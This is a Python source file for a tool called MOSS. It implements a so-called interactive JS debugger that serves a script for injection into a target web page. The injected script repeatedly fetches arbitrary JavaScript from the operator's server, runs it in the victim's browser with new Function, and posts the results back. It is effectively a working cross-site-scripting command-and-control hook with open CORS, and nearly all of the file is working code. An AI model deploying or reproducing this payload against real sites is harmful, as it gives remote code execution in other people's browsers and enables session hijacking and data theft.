"""
ext/debugger.py

Interactive JS Debugging Agent for MOSS.

Serves a JS payload for browser injection that executes commands
received from a TUI prompt and returns results.

Usage:
    moss -e debugger -p 8000
    # Inject into target page: <script src="http://IP:8000/debugger/{RANDOM}"></script>
    # Type JS commands at the debug> prompt
"""

from contextlib import nullcontext
from dataclasses import dataclass, field
from urllib.parse import urlsplit, parse_qs
import threading
import time
import json
import random

try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.history import InMemoryHistory
    from prompt_toolkit.patch_stdout import patch_stdout
    HAS_PROMPT_TOOLKIT = True
except ImportError:
    HAS_PROMPT_TOOLKIT = False

GROUP = "debugger (ext/debugger.py)"

def _field(default, group=None, doc="", metadata={}, flags=[], choices=[], **kwargs):
    dwargs = {}
    if type(default).__name__ in ('function', 'type'):
        dwargs["default_factory"] = default
    else:
        dwargs["default"] = default
    return field(**dwargs, metadata=metadata | dict(group=group, doc=doc, flags=flags, choices=choices, **kwargs))

CORS = {"Access-Control-Allow-Origin": "*"}

# ────────────────────────────────────────────────
#   Browser Payload (eval-able JS)
# ────────────────────────────────────────────────

BROWSER_JS = """(function(){
var b='';try{var s=document.currentScript&&document.currentScript.src;if(s){var u=s.split('?')[0];b=u.substring(0,u.lastIndexOf('/'))}}catch(e){}
if(!b)b=window.__MOSS_BASE||window.location.origin;
var i=-1,p=0;
function generateId(length = 6) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let id = '';
  for (let i = 0; i < length; i++) {
    id += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return id;
}
var nm = generateId();

function n(){setTimeout(function(){if(!p)r()},2e3)}
function r(){p=1;fetch(b+'/debugger/{RANDOM}/pending?name='+nm+'&last_id='+i,{credentials:'omit'}).then(function(x){if(!x.ok)throw Error(x.status);return x.json()}).then(function(c){
c.forEach(function(m){var a,d;try{var f=new Function('return '+m.code);a=f();a=a===void 0?'undefined':String(a)}catch(e){d=String(e)}
var g={id:m.id,name:nm};d?g.error=d:g.result=a;fetch(b+'/debugger/{RANDOM}/result',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(g),credentials:'omit'}).catch(function(){});i=m.id});p=0;n()}).catch(function(){p=0;n()})}
r()})();"""

# ────────────────────────────────────────────────
#   Mixin — CLI flags, shared state, input thread
# ────────────────────────────────────────────────

BROWSER_TIMEOUT = 15

def random_id(n: int):
    return "".join(random.sample("abcdefghijkmnopqrstuvwxyz0123456789", n))


@dataclass
class DebuggerMixin:
    debugger_path: str = _field("/debugger/{RANDOM}", group=GROUP, flags=["--debugger-path"], doc="URL path for the interactive debugger JS payload. Use {RANDOM} to insert a random ID in the path")
    debugger_no_input: bool = _field(False, group=GROUP, flags=["--debugger-no-input"], doc="Disable the TUI input thread (for testing)")
    debugger_random_id_length: int = _field(8, group=GROUP, flags=["--debugger-id-length"], doc="The length of the random ID. Consider using the --block-scanners flag to mitigate against brute-forcing. Set to 0 to replace {RANDOM} with nothing")

    def __post_init__(self):
        self._pending = []
        self._results = []
        self._connections = {}
        self._lock = threading.Lock()
        self._next_id = 0
        self._shutdown = False
        self._last_browser_poll = 0.0
        self._browser_js = BROWSER_JS

        if self.debugger_random_id_length > 0:
            instance_id = random_id(self.debugger_random_id_length)
            self.debugger_path = self.debugger_path.replace("{RANDOM}", instance_id)
            self._browser_js = self._browser_js.replace("{RANDOM}", instance_id)
        else:
            self.debugger_path = self.debugger_path.replace("/{RANDOM}", "")
            self._browser_js = self._browser_js.replace("/{RANDOM}", "")

        try:
            import prompt_toolkit
        except ImportError:
            self.warning(f"debugger works best with the prompt_toolkit package:")
            self.warning(f"")
            self.warning(f"\tpip install prompt_toolkit")
            self.warning(f"")
            self.warning(f"This is an OPTIONAL dependency which makes the TUI feel smoother.")

        super().__post_init__()

        if not self.debugger_no_input:
            self._start_input_thread()
        self.printstatus(f"Debugger: http://127.0.0.1:{self.port}{self.debugger_path}")

    def _print_result(self, r):
        name = r.get("name", "???")
        cid = r["id"]
        if r.get("error"):
            print(f"  \u2717 ({name})[{cid}] {r['error']}")
        else:
            print(f"  \u2713 ({name})[{cid}] {r.get('result', 'undefined')}")

    # TODO: figure out a cleaner of managing mixin variables so that we can avoid making the mistake of clearing variables when they are actually copied (shallowly) to the server object.
    def _drain_results(self):
        drained = []
        with self._lock:
            while self.server._results:
                drained.append(self.server._results.pop(0))
        for r in drained:
            self._print_result(r)

    def _start_input_thread(self):
        session = PromptSession(history=InMemoryHistory()) if HAS_PROMPT_TOOLKIT else None
        ctx = patch_stdout() if session else nullcontext()

        def _input_loop():
            with ctx:
                while not self._shutdown:
                    self._drain_results()
                    try:
                        if session:
                            code = session.prompt(f"debug [{self._next_id}]> ")
                        else:
                            code = input(f"debug [{self._next_id}]> ")
                    except (EOFError, KeyboardInterrupt):
                        break
                    if not code.strip():
                        continue
                    if time.time() - self.server._last_browser_poll > BROWSER_TIMEOUT:
                        print(f"(no browser connected — inject the debugger first)")
                        continue
                    cmd_id = self._next_id
                    self._next_id += 1
                    with self._lock:
                        self.server._pending.append({"id": cmd_id, "code": code})

        t = threading.Thread(target=_input_loop, daemon=True)
        t.start()

# ────────────────────────────────────────────────
#   Processor — HTTP handlers
# ────────────────────────────────────────────────

class DebuggerProcessor:
    def get_services(self, server):
        return [(server.debugger_path.rstrip("/") + "/html", "launch browser-based callback")]

    def _base(self, req):
        return req.server.debugger_path.rstrip("/")

    def do_OPTIONS(self, req):
        path = urlsplit(req.path).path.rstrip("/")
        base = self._base(req)
        if path in (base, base + "/pending", base + "/result"):
            req.send_response(200)
            req.send_header("Access-Control-Allow-Origin", "*")
            req.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            req.send_header("Access-Control-Allow-Headers", "Content-Type")
            req.send_header("Access-Control-Max-Age", "86400")
            req.end_headers()
            return True
        return None

    def do_GET(self, req):
        path = urlsplit(req.path).path.rstrip("/")
        base = self._base(req)
        # print(path)

        if path == base:
            req.send_response_full(200, content=req.server._browser_js, mime="text/javascript", headers=CORS)
            return True

        if path == base + "/html":
            content = f"<html><body><script>{req.server._browser_js}</script></body></html>"
            req.send_response_full(200, content=content, mime="text/html")
            return True

        if path == base + "/pending":
            qs = parse_qs(urlsplit(req.path).query)
            try:
                last_id = int(qs.get("last_id", [0])[0])
            except (ValueError, IndexError):
                last_id = 0
            # TODO: add reset logic if last_id >= server._next_id
            try:
                name = qs.get("name", [0])[0]
            except (ValueError, IndexError):
                name = "???"
            with req.server._lock:
                ip, _ = req.client_address
                conn_name = f'{ip}_{name}'
                if conn_name not in req.server._connections:
                    print(f"New connection: {conn_name}")
                req.server._connections[conn_name] = req.server._last_browser_poll = time.time()
                pending = [c for c in req.server._pending if c["id"] > last_id]
            body = json.dumps(pending).encode()
            req.send_response_full(200, content=body, mime="application/json", headers=CORS)
            return True

        return None

    def do_POST(self, req):
        path = urlsplit(req.path).path.rstrip("/")
        base = self._base(req)
        # print('result!')

        if path == base + "/result":
            try:
                data = json.loads(req.body)
            except (json.JSONDecodeError, UnicodeDecodeError, ValueError):
                req.send_response_full(400, headers=CORS)
                return True
            if not isinstance(data, dict) or "id" not in data:
                req.send_response_full(400, headers=CORS)
                return True
            with req.server._lock:
                req.server._results.append(data)
                # req.server._pending = [c for c in req.server._pending if c["id"] != data["id"]]
            req.server.instance._print_result(data)
            req.send_response_full(200, content=b'{"ok":true}', mime="application/json", headers=CORS)
            return True

        return None
